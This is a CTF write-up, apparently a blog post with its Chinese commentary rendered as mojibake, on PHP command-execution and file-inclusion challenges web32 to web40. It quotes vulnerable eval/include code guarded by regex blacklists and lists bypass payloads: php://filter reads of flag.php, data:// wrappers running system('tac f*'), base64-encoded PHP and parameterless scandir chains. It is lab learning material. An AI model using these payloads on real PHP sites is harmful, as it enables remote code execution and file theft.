passthru()å‡½æ•°ä¸»è¦ç”¨äºæ‰§è¡Œä¸€äº›ä¼šäº§ç”ŸäºŒè¿›åˆ¶è¾“å‡ºçš„å‘½ä»¤\nexec()//å®ƒä¸»è¦æ˜¯è·å–å‘½ä»¤æ‰§è¡Œåçš„æœ€åä¸€è¡Œè¾“å‡ºã€‚å®ƒä¼šå°†å‘½ä»¤çš„è¾“å‡ºæ”¾å…¥ä¸€ä¸ªæ•°ç»„ï¼ˆå¦‚æœæä¾›äº†ç¬¬äºŒä¸ªå‚æ•°ï¼‰ï¼Œå¹¶ä¸”è¿”å›å‘½ä»¤çš„æœ€åä¸€è¡Œè¾“å‡ºå†…å®¹ã€‚\nshell_exec()//shell_exec()å‡½æ•°æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›å‘½ä»¤çš„è¾“å‡ºç»“æœï¼ˆä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ã€‚å®ƒç±»ä¼¼äºexec()å‡½æ•°ï¼Œä½†è¿”å›çš„æ˜¯å®Œæ•´çš„è¾“å‡ºï¼Œè€Œä¸æ˜¯æœ€åä¸€è¡Œã€‚\npopen()\nproc_open()\npcntl_exec()\nåå¼•å· åŒshell_exec() \n\n```\n\n\n\n**åå¼•å·åœ¨phpä¸­ç±»ä¼¼äºsystemå‡½æ•° å¯ä»¥æ‰§è¡Œshellå‘½ä»¤**\n\n#### web32\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload:php://filter/read=convert.base64-encode/resource=flag.php #ä¼ªåè®®\n\n?c=include_$GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\nincludeå‡½æ•°:includeæ˜¯ PHP ä¸­çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å°†æŒ‡å®šçš„æ–‡ä»¶å†…å®¹åŒ…å«åˆ°å½“å‰çš„ PHP è„šæœ¬ä¸­å¹¶æ‰§è¡Œã€‚è¿™æ„å‘³ç€è¢«åŒ…å«æ–‡ä»¶ä¸­çš„ PHP ä»£ç å°†åœ¨åŒ…å«å®ƒçš„è„šæœ¬çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œå°±å¥½åƒä»£ç æ˜¯ç›´æ¥å†™åœ¨åŒ…å«å®ƒçš„è„šæœ¬ä¸­ä¸€æ ·ã€‚\n```\n\nè¿™é‡Œè¿‡æ»¤äº†åæ–œæ æ–œæ åˆ†å·ä¹‹ç±»çš„\n\næ€è·¯æ˜¯ç”¨includeå‡½æ•°å®ç°ä¸ç”¨æ‹¬å·çš„æ–‡ä»¶åŒ…å«,ç„¶åå†é…åˆä¼ªåè®®,åˆ†å·ä½¿ç”¨>?ä»£æ›¿\n\nåœ¨è¿™é‡Œæˆ‘å¯¹äº**include_$GET**è¿™ä¸€å†…å®¹ä¸å¤ªç†è§£å»é—®sunå¸ˆå‚…,å­™å¸ˆå‚…å‘Šè¯‰æˆ‘è¯´æ˜¯å®ç°æ–‡ä»¶åŒ…å«é‡é€ å˜é‡--é‡é€ äº†cmdè¿™ä¸ªä¼ å‚ç„¶åä½¿å¾—ä¼ å‚ä¸å—é™åˆ¶äº†,**>?**ä»£æ›¿äº†åˆ†å·\n\n#### web33\n\n\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n} \n//è¿‡æ»¤äº†åŒå¼•å·,å®Œå…¨å¯ä»¥ç…§æ¬32çš„payload\n\n\n\n?c=include_$GET[lww]?\n>&lww=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\n```\n\n#### web34\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nå¯ä»¥ä¸€æ ·ç”¨ä¸Šé¢çš„payload\n\n```\n\n#### web35\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\npayload;\n?c=include%0a$_GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n\n?c=include$_GET[cmd]?>&cmd=data://text/plan,<?php system(\"tac flag.php\")?>\n\n?c=include$_GET[cmd]?>&cmd=data://text/plan;base64;PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n#åˆ°è¿™é‡Œæœ‰ä¸‰ç§æ–¹æ³•å¯ä»¥ä½¿ç”¨\n\n```\n\nè¿‡æ»¤äº†ï¼Œ=å·å’Œ<æ‹¬å·è¿™é‡Œå¯ä»¥ä½¿ç”¨dataçš„base64 æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤åŠ å¯†äº†ä¼ è¿›å»<?php system(\"cat flag.php\");?>\n\n```base\nPD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n```\n\n#### web36\n\n```\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\<|\\=|\\/|[0-9]/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload;\n?c=include%0a$_GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[cmd]?>&cmd=data://text/plan,<?php system(\"tac flag.php\")?>\n\n\n```\n\nè¿™æ¬¡æ˜¯å¤šåŠ äº†0-9çš„ä¼ å‚ä¹Ÿå°±æ˜¯è¯´cä¼ å‚é‡Œé¢åŸæ¥çš„GET[cmd]æœ¬æ¥æ˜¯ä»»æ„å–å€¼çš„ç°åœ¨çš„å‚æ•°é‡Œé¢ä¸èƒ½æœ‰æ•°å­—\n\n#### web37\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n?c=php://filter/read=convert.base64-encode/resource=flag.php #è¿™é‡Œè¿‡æ»¤äº†flagä¸è¦ä½¿ç”¨è¿™ä¸€æ¡æ²¡ç”¨ æˆ‘åªæ˜¯éƒ½æƒ³æµ‹ä¸€éç”¨ä¸‹é¢ä¸¤ä¸ª\n?c=data://text/palin,<?php system(\"tac f*\");?>\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\n```\n\n#### web38\n\n```php\n//flag in flag.php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|php|file/i\", $c)){\n        include($c);\n        echo $flag;\n    }\n\n}else{\n    highlight_file(__FILE__);\n}\ndata:// æ˜¯ PHP æ”¯æŒçš„ä¸€ä¸ªæ•°æ®æµåŒ…è£…åè®®ï¼Œå…è®¸ä½ ä½¿ç”¨æ•°æ®ï¼ˆåœ¨è¿™é‡Œæ˜¯ PHP ä»£ç ï¼‰ä½œä¸ºæ–‡ä»¶ã€‚\ntext/palin æ˜¯ data:// åè®®çš„å­ç±»å‹ï¼ŒæŒ‡å®šäº†æ•°æ®çš„ç±»å‹ä¸ºçº¯æ–‡æœ¬ã€‚\n<?=system(\"tac f*\");?> æ˜¯ PHP ä»£ç ï¼Œä½¿ç”¨ system å‡½æ•°æ‰§è¡Œ tac f* å‘½ä»¤ã€‚\n    \n    payload:\n?c=data://text/palin,<?php system(\"tac f*\");?> #ï¼ˆä½¿ç”¨ä¸äº†ç”¨ç¬¬äºŒä¸ªæˆ‘åªæ˜¯è¿›è¡Œå¯¹æ¯”ï¼‰è¿™é‡Œphpè¢«è¿‡æ»¤äº†ä½¿ç”¨ä¸äº†å¯ä»¥æ”¹ä¸ºçŸ­æ ‡ç­¾\n?c=data://text/palin,<?=system(\"tac f*\");?>\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\n```\n\n#### web39\n\n```php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c.\".php\");\n    }//ä½¿ç”¨ preg_match å‡½æ•°å’Œæ­£åˆ™è¡¨è¾¾å¼ /flag/i æ£€æŸ¥ $c ä¸­æ˜¯å¦åŒ…å« flagï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚å¦‚æœä¸åŒ…å«ï¼Œå°† $c åé¢æ·»åŠ  .php åç¼€å¹¶ä½¿ç”¨ include å‡½æ•°åŒ…å«è¯¥æ–‡ä»¶ã€‚\n\n        \n}else{\n    highlight_file(__FILE__);\n}\npayload:\n?c=data://text/palin,<?=system(\"tac f*\");?>\n?c=data://text/palin,<?php system(\"tac f*\");?>\n\n```\n\nè¿™ä¸ªåœ°æ–¹ include($c.\".php\");æˆ‘æœ‰å¾ˆå¤§çš„ç–‘é—®,å°±æ˜¯è±†åŒ…ç»™çš„è§£é‡Šæ˜¯`include($c.\".php\");`ï¼šå°†æ‹¼æ¥åçš„å­—ç¬¦ä¸²ä½œä¸ºæ–‡ä»¶è·¯å¾„ï¼Œå°è¯•åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼ŒPHP ä¼šå°†è¯¥æ–‡ä»¶çš„å†…å®¹åŒ…å«åˆ°å½“å‰æ–‡ä»¶ä¸­å¹¶æ‰§è¡Œï¼›å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ ¹æ® PHP çš„é…ç½®ä¸åŒï¼Œå¯èƒ½ä¼šäº§ç”Ÿä¸€ä¸ªè­¦å‘Šæˆ–é”™è¯¯ï¼ˆä¸è¿‡åœ¨è¿™æ®µä»£ç ä¸­ï¼Œç”±äº `error_reporting(0);` çš„è®¾ç½®ï¼Œé”™è¯¯ä¸ä¼šæ˜¾ç¤ºï¼‰ã€‚\n\nä½†æ˜¯è¿™æ ·è§£é‡Šæ˜¯å¾—ä¸åˆ°flagçš„,äºæ˜¯æˆ‘æŠŠsunå¸ˆå‚…å–Šèµ·æ¥é—®ä»–sunå¸ˆå‚…è§£é‡Šä¸€ç•ªä½†æ˜¯æˆ‘æ„Ÿè§‰ä¸æ˜¯å¾ˆç†è§£\n\næœ€åçš„ç»“è®ºæ˜¯:\tcæ˜¯data://text/palin,<?php system(\"tac f*\");?>åé¢è¡”æ¥.php  ä½†æ˜¯è¿™æ ·ç†è§£æ˜¯ä¸å¯¹çš„   æˆ‘çš„ç†è§£æ˜¯åœ¨èµ‹å€¼çš„æ—¶å€™å°±å·²ç»è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†åé¢çš„.phpå®é™…ä¸Šæ²¡æœ‰ç”¨åˆ°\t\n\n\n\n\n\n#### web40\n\n```php\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", $c)){\n        eval($c);\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\npayload\n?c=print_r(show_source(array_rand(array_flip(scandir(pos(localeconv()))))));\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\nnext()ï¼š å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n?c=print_r(scandir(current(localeconv())));\nscandir(current(localeconv())) æŸ¥çœ‹å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶å\n?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n\n```\n\næ— å‚æ–‡ä»¶è¯»å–ä¸æ˜¯æ— å›æ˜¾\n\nè¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ æœ‰å¤§å†™å¾—æ‹¬å· è¿™é‡Œå¾—è€ƒç‚¹æ˜¯ï¼šæ— å‚æ•°æ–‡ä»¶è¯»å– æ— å‚æ•°çš„æ„æ€å¯ä»¥æ˜¯a()ã€a(b())æˆ–a(b(c()))ï¼Œä½†ä¸èƒ½æ˜¯a('b')æˆ–a('b','c')ï¼Œä¸èƒ½å¸¦å‚æ•° localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚\ncurrent() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œ\npos() åŒ current() ,æ˜¯current()çš„åˆ«å\nreset() å‡½æ•°è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå•å…ƒçš„å€¼ï¼Œå¦‚æœæ•°ç»„ä¸ºç©ºåˆ™è¿”å› FALSE\narray_reverse()ï¼šæ•°ç»„é€†åº\narray_flip()æ˜¯äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼\n","tags":["RCE"]}]